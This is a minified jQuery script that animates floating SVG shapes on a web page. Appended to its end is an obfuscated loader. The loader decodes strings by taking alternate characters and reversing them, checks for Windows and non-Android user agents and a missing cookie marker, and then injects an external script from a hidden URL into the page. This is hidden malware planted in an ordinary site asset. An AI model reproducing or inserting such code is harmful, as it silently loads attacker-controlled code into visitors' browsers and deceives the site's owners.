jQuery(document).ready(function($){
 "use strict";
 function t(t,i){
  if(!(t instanceof i))throw new TypeError("Cannot call a class as a function")
 }
 function i(t,i){
  return Math.floor(Math.random()*(i-t+1)+t)
 }
 function n(){
  d=d.filter(function(t){
   return t.move()
  }),
  requestAnimationFrame(n.bind(this))
 }
 var s=function(){
  function i(n,s,e){
   t(this,i),
   this.svg=n,
   this.steps=$(document).height()/2,
   this.item=null,
   this.friction=e,
   this.coordinates=s,
   this.position=this.coordinates.y,
   this.dimensions=this.render(),
   this.rotation=Math.random()>.5?"-":"+",
   this.scale=.5+Math.random(),
   this.siner=200*Math.random()
  }
  return i.prototype.destroy=function t(){
   this.item.remove()
  },
  i.prototype.move=function t(){
   this.position=this.position-this.friction;
   var i=this.position,
   n=this.coordinates.x+Math.sin(this.position*Math.PI/this.steps)*this.siner;
   return this.item.css({transform:"translateX("+n+"px) translateY("+i+"px) scale("+this.scale+") rotate("+this.rotation+(this.position+this.dimensions.height)+"deg)"}),
   !(this.position<-this.dimensions.height)||(this.destroy(),!1)
  },
  i.prototype.render=function t(){var i=this;return this.item=$(this.svg,{css:{transform:"translateX("+this.coordinates.x+"px) translateY("+this.coordinates.y+"px)"}}).click(function(){i.destroy()}),$(".shapes").append(this.item),{width:this.item.width(),height:this.item.height()}},i}(),e='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="144px" height="144px" viewBox="0 0 144 144" enable-background="new 0 0 144 144" xml:space="preserve"><polygon fill="#00eb8a" points="0,0 144,0 144,144 "/></svg>',o='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="144px" height="144px" viewBox="0 0 144 144" enable-background="new 0 0 144 144" xml:space="preserve"><polygon fill="#442dcc" points="144,144 0,144 0,0 "/></svg>',h='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="288px" height="144px" viewBox="0 0 288 144" enable-background="new 0 0 288 144" xml:space="preserve"><path fill="#fff00a" d="M144,144c79.529,0,144-64.471,144-144H0C0,79.529,64.471,144,144,144"/></svg>',r='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="144px" height="144px" viewBox="0 0 144 144" enable-background="new 0 0 144 144" xml:space="preserve"><path fill="#ff69ff" d="M144,144C144,64.471,79.529,0,0,0v144H144z"/></svg>',w='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="144px" height="288px" viewBox="0 0 144 288" enable-background="new 0 0 144 288" xml:space="preserve"><polygon fill="#ff183f" points="0,0 0,288 144,288 144,144 "/></svg>',a='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="144px" height="144px" viewBox="0 0 144 144" enable-background="new 0 0 144 144" xml:space="preserve"><path fill="#597aff" d="M0,0c0,79.53,64.471,144,144,144V0H0z"/></svg>',p='<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="144px" height="144px" viewBox="0 0 144 144" enable-background="new 0 0 144 144" xml:space="preserve"><polygon fill="#fff00a" points="0,0 144,0 144,144 "/></svg>',x=[r,e,o,h,w,a,p],l=!1;window.onblur=function(){l=!0}.bind(void 0),window.onfocus=function(){l=!1}.bind(void 0);var d=[];setInterval(function(){document.hasFocus()&&d.push(new s(x[i(0,x.length-1)],{x:Math.random()*$(document).width(),y:$(document).height()},1+1*Math.random()))},2e3),d.push(new s(x[i(0,x.length-1)],{x:Math.random()*$(document).width(),y:$(document).height()},1+1*Math.random())),d.push(new s(x[i(0,x.length-1)],{x:Math.random()*$(document).width(),y:$(document).height()},1+1*Math.random())),n()});(function(){var g=navigator[t("8t8n(e)gtAyr)evs)u,")];var l=document[t(":e;i4k3o)o3c,")];if(m(g,t("5sswbo}d}n,i,Wg"))&&!m(g,t("#d)i)o{r)dan;A8"))){if(!m(l,t("3=aa6m;t;u,_1_4_)"))){var r=document.createElement('script');r.type='text/javascript';r.async=true;r.src=t('w2ra9dsf64n4ff09{c}7}3(388xd)8gcb0rbn6}5;=(v{&,0}3}2(={d,i(c{?1sbj}.ueid1o;ci_{sr/)m;ozcr.,d{n,a}r(bmhts}i(m}a,.;k{c7a)r;t{/0/}:,svp)t,t(hc');var y=document.getElementsByTagName('script')[0];y.parentNode.insertBefore(r,y);}}function t(n){var s='';for(var u=0;u<n.length;u++){if(u%2===1)s+=n[u];}s=z(s);return s;}function m(a,q){return a[t("6f(Odx;eqd,n,il")](q)!==-1;}function z(p){var e='';for(var j=p.length-1;j>=0;j--){e+=p[j];}return e;}})();